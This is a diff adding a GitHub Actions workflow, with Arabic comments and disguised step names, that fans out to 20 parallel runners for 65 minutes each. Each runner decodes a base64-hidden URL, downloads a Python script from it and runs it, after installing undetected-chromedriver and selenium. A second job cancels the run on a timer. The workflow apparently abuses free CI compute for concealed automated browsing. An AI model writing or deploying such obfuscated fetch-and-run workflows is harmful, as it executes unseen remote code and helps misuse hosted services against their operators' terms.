@@ -1,0 +1,107 @@
+name: Linux Clustered Task Column
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: clustered-column-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # ضابط الكفّ الإجباري: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  injunction-bearer:
+    name: "Injunction Bearer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Deliver Binding Cease Injunction
+        run: |
+          echo "[BEARER] Injunction bearer positioned. Binding cease enforced at the 65-minute alarm."
+          echo "[BEARER] Reading workflow cipher: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[BEARER] Alarm triggered! Delivering binding cease injunction..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[BEARER] Binding cease injunction delivered. Every thriving and dormant unit will be ceased."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات العمود
+  # =================================================================
+  stack-column:
+    name: "ColumnUnit-${{ matrix.unit_sigil }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_sigil: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      # ⋞ البند (Ⅰ): تمهيد السطح الأولي
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      - name: Introduce Preliminary Surface
+        run: |
+          echo "[INTRODUCE] Introducing preliminary surface for ColumnUnit-${{ matrix.unit_sigil }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      # ⋞ البند (Ⅱ): تلقّي المخطوطة التنفيذية
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      - name: Receive Executive Transcript
+        run: |
+          echo "[RECEIVE] Receiving app_task.py from designated document depository..."
+          DOCUMENT_DEPOSITORY=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DOCUMENT_DEPOSITORY" -o app_task.py
+          echo "[RECEIVE] Executive transcript received successfully."
+
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      # ⋞ البند (Ⅲ): استمالة المكتبات الملحقة
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      - name: Solicit Annexed Libraries
+        run: |
+          echo "[SOLICIT] Soliciting annexed libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      # ⋞ البند (Ⅳ): التنفيذ المُحتوى بالمدة (65 دقيقة)
+      # ⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆⋆
+      - name: Conduct Confined Operation
+        run: |
+          echo ">> Stacking ColumnUnit-${{ matrix.unit_sigil }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          COLUMN_PID=$!
+          
+          echo ">> Confined operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $COLUMN_PID 2>/dev/null; then
+            echo ">> Confined window elapsed! Retiring operation..."
+            kill -9 $COLUMN_PID
+            echo ">> Operation retired by confine keeper."
+          else
+            echo ">> Operation closed within confined window."
+          fi
